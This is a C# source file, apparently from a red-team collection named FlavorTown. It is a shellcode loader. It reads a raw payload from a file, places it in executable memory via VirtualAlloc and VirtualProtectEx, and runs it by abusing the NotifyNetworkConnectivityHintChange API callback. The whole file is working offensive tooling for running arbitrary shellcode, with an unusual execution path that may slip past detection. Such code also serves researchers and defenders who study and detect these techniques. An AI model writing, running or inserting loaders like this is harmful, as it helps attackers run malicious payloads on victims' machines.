// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NotifyNetworkConnectivityHintChange
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: NotifyNetworkConnectivityHintChange.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hNotification = IntPtr.Zero;
            NotifyNetworkConnectivityHintChange(hAlloc, IntPtr.Zero, true, out hNotification);

            System.Threading.Thread.Sleep(120 * 1000); //2 Min
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyNetworkConnectivityHintChange(IntPtr Callback,
            IntPtr CallerContext, bool InitialNotification,
            out IntPtr NotificationHandle);
    }
}
